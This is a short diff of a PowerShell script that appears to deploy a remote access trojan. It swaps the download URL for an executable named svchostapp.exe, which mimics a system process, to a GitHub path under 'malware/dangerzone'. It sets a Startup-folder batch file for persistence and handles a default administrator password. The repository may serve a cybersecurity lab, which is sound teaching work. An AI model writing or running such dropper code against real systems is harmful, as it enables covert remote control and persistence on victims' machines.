@@ -9,7 +9,7 @@ param(
   [String]$downloadlink
 )
 
-$raturl = "https://srv-store1.gofile.io/download/VHmBL1/svchostapp.exe"
+$raturl = "https://github.com/cybermias/publicrep/raw/master/malware/dangerzone/svchostapp.exe"
 $startup = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\runadm.bat"
 
 $temppwd = ConvertTo-SecureString -String $defAdminPwd -AsPlainText -Force
